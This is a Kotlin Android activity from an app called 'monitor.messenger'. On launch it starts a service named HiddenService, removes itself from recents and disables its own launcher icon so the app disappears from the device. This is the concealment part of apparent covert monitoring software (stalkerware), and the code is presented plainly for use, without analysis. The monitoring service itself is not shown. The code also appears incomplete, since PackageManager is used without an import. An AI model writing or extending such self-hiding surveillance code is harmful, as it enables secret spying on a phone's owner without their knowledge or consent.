package com.monitor.messenger

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Immediately start the service
        startMonitoringService()
        
        // Remove launcher icon from recents
        finishAndRemoveTask()
    }

    private fun startMonitoringService() {
        val intent = Intent(this, HiddenService::class.java)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        
        // Hide app icon from launcher
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show()
    }
}
